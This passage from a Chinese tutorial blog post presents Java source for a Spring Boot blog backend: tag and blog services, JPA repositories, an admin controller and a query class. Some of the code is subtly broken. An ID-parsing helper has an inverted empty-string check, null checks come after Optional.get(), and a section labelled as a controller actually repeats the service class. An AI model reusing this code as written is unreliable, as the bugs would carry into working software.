class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.util.StringUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/7.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TagServiceImpl</span> <span class="keyword">implements</span> <span class="title">TagService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TagRepository tagRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tag <span class="title">saveTag</span><span class="params">(Tag tag)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tagRepository.save(tag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tag <span class="title">getTag</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tagRepository.findById(id).get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tag <span class="title">getTagByName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tagRepository.findByName(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Tag&gt; <span class="title">listTag</span><span class="params">(Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tagRepository.findAll(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Tag&gt; <span class="title">listTag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tagRepository.findAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Tag&gt; <span class="title">listTag</span><span class="params">(String ids)</span> </span>&#123;  <span class="comment">//1,2,3</span></span><br><span class="line">        <span class="keyword">return</span> tagRepository.findAllById(convertToList(ids));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> List&lt;Long&gt; <span class="title">convertToList</span><span class="params">(String ids)</span></span>&#123;</span><br><span class="line">        List&lt;Long&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;&quot;</span>.equals(ids) &amp;&amp; ids != <span class="keyword">null</span>)&#123;</span><br><span class="line">            String[] idarray = ids.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;idarray.length; i++)&#123;</span><br><span class="line">                list.add(<span class="keyword">new</span> Long(idarray[i]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tag <span class="title">updateTag</span><span class="params">(Long id, Tag tag)</span> </span>&#123;</span><br><span class="line">        Tag t = tagRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (t == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;您查找的信息不存在(︶︹︺)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        BeanUtils.copyProperties(tag,t);</span><br><span class="line">        <span class="keyword">return</span> tagRepository.save(t);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteTag</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        tagRepository.deleteById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>TagRepository.java 标签业务 SQL操作接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Tag;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/7.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TagRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">Tag</span>,<span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="function">Tag <span class="title">findByName</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TagController.java WEB操作</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.TagRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Tag;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/7.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TagServiceImpl</span> <span class="keyword">implements</span> <span class="title">TagService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TagRepository tagRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tag <span class="title">saveTag</span><span class="params">(Tag tag)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tagRepository.save(tag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tag <span class="title">getTag</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tagRepository.findById(id).get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tag <span class="title">getTagByName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tagRepository.findByName(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Tag&gt; <span class="title">listTag</span><span class="params">(Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tagRepository.findAll(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tag <span class="title">updateTag</span><span class="params">(Long id, Tag tag)</span> </span>&#123;</span><br><span class="line">        Tag t = tagRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (t == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;您查找的信息不存在(︶︹︺)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        BeanUtils.copyProperties(tag,t);</span><br><span class="line">        <span class="keyword">return</span> tagRepository.save(t);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteTag</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        tagRepository.deleteById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="博客业务处理"><a href="#博客业务处理" class="headerlink" title="博客业务处理"></a>博客业务处理</h3><p>BlogService.java 博客业务处理逻辑接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">getBlog</span><span class="params">(Long id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable, BlogQuery blogQuery)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">saveBlog</span><span class="params">(Blog blog)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Blog <span class="title">updateBlog</span><span class="params">(Long id,Blog blog)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteBlog</span><span class="params">(Long id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogServiceImpl.java 博客业务处理逻辑实现类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.BlogRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.util.MyBeanUtils;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.domain.Specification;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.CriteriaBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.CriteriaQuery;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.Predicate;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.Root;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BlogServiceImpl</span> <span class="keyword">implements</span> <span class="title">BlogService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogRepository blogRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">getBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findById(id).get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable, BlogQuery blogQuery)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(<span class="keyword">new</span> Specification&lt;Blog&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Predicate <span class="title">toPredicate</span><span class="params">(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder)</span> </span>&#123;</span><br><span class="line">                List&lt;Predicate&gt; predicateList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(blogQuery.getTitle()) &amp;&amp; blogQuery.getTitle() != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.like(root.&lt;String&gt;get(<span class="string">&quot;title&quot;</span>),<span class="string">&quot;%&quot;</span>+blogQuery.getTitle()+<span class="string">&quot;%&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (blogQuery.getTypeID() != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.equal(root.&lt;Type&gt;get(<span class="string">&quot;type&quot;</span>).get(<span class="string">&quot;id&quot;</span>),blogQuery.getTypeID()));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (blogQuery.isRecommend())&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.equal(root.&lt;Boolean&gt;get(<span class="string">&quot;recommend&quot;</span>),blogQuery.isRecommend()));</span><br><span class="line">                &#125;</span><br><span class="line">                criteriaQuery.where(predicateList.toArray(<span class="keyword">new</span> Predicate[predicateList.size()]));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">saveBlog</span><span class="params">(Blog blog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (blog.getId() == <span class="keyword">null</span>)&#123;</span><br><span class="line">            blog.setCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            blog.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            blog.setViews(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            blog.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.save(blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">updateBlog</span><span class="params">(Long id, Blog blog)</span> </span>&#123;</span><br><span class="line">        Blog b = blogRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;管理员大大,这个博客不存在哦！～(　TロT)σ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        BeanUtils.copyProperties(blog,b, MyBeanUtils.getNullPropertyNames(blog));</span><br><span class="line">        b.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        <span class="keyword">return</span> blogRepository.save(b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        blogRepository.deleteById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BlogRepository.java 博客业务 SQL操作接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaSpecificationExecutor;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">Blog</span>,<span class="title">Long</span>&gt;, <span class="title">JpaSpecificationExecutor</span>&lt;<span class="title">Blog</span>&gt; </span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogController.java WEB操作</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.web.admin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Tag;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.BlogService;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.TagService;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.TypeService;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.web.PageableDefault;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.support.RedirectAttributes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/5.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/admin&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BlogController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span>  String INPUT = <span class="string">&quot;/admin/blogs-input&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span>  String LIST = <span class="string">&quot;/admin/blogs&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span>  String REDIRECT_LIST = <span class="string">&quot;redirect:/admin/blogs&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogService blogService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TypeService typeService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TagService tagService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/blogs&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">blogs</span><span class="params">(<span class="meta">@PageableDefault(size = 10,sort = &#123;&quot;updateTime&quot;&#125;,direction = Sort.Direction.DESC)</span> Pageable pageable, BlogQuery blogQuery, Model model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;types&quot;</span>,typeService.listType());</span><br><span class="line">        model.addAttribute(<span class="string">&quot;page&quot;</span>,blogService.listBlog(pageable,blogQuery));</span><br><span class="line">        <span class="keyword">return</span> LIST;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/blogs/search&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">search</span><span class="params">(<span class="meta">@PageableDefault(size = 10,sort = &#123;&quot;updateTime&quot;&#125;,direction = Sort.Direction.DESC)</span> Pageable pageable,BlogQuery blogQuery,Model model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;page&quot;</span>,blogService.listBlog(pageable,blogQuery));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;/admin/blogs :: blogList&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/blogs/input&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">input</span><span class="params">(Model model)</span></span>&#123;</span><br><span class="line">        setTypeAndTag(model);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;blog&quot;</span>,<span class="keyword">new</span> Blog());</span><br><span class="line">        <span class="keyword">return</span> INPUT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setTypeAndTag</span><span class="params">(Model model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;types&quot;</span>,typeService.listType());</span><br><span class="line">        model.addAttribute(<span class="string">&quot;tags&quot;</span>,tagService.listTag());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/blogs/&#123;id&#125;/input&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">editInput</span> <span class="params">(<span class="meta">@PathVariable</span> Long id, Model model)</span></span>&#123;</span><br><span class="line">        setTypeAndTag(model);</span><br><span class="line">        Blog blog = blogService.getBlog(id);</span><br><span class="line">        blog.init();</span><br><span class="line">        model.addAttribute(<span class="string">&quot;blog&quot;</span>,blog);</span><br><span class="line">        <span class="keyword">return</span> INPUT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/blogs&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">post</span><span class="params">(Blog blog, RedirectAttributes attributes, HttpSession session)</span></span>&#123;</span><br><span class="line">        blog.setUser((User) session.getAttribute(<span class="string">&quot;user&quot;</span>));</span><br><span class="line">        blog.setType(typeService.getType(blog.getType().getId()));</span><br><span class="line">        blog.setTags(tagService.listTag(blog.getTagIds()));</span><br><span class="line">        Blog b;</span><br><span class="line">        <span class="keyword">if</span> (blog.getId() == <span class="keyword">null</span>)&#123;</span><br><span class="line">            b = blogService.saveBlog(blog);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            b = blogService.updateBlog(blog.getId(),blog);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="keyword">null</span>)&#123;</span><br><span class="line">            attributes.addFlashAttribute(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;操作失败 ﾍ(;´Д｀ﾍ),管理员大大重新试下吧&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            attributes.addFlashAttribute(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;操作成功 ≖‿≖✧ 快去发布新内容吧&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> REDIRECT_LIST;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/blogs/&#123;id&#125;/delete&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">delete</span><span class="params">(<span class="meta">@PathVariable</span> Long id,RedirectAttributes attributes)</span></span>&#123;</span><br><span class="line">        blogService.deleteBlog(id);</span><br><span class="line">        attributes.addFlashAttribute(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;删除成功,期待您发布更加美好的内容︿(￣︶￣)︿&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> REDIRECT_LIST;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogQuery.java 博客搜索查询类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.vo;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BlogQuery</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> Long typeID;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> recommend;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BlogQuery</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getTitle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTitle</span><span class="params">(String title)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getTypeID</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> typeID;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTypeID</span><span class="params">(Long typeID)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.typeID = typeID;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isRecommend</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> recommend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRecommend</span><span class="params">(<span class="keyword">boolean</span> recommend)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.recommend = recommend;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Blog.java 博客实体类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.*;</span><br><span class="line"><span class="keyword">import</span> 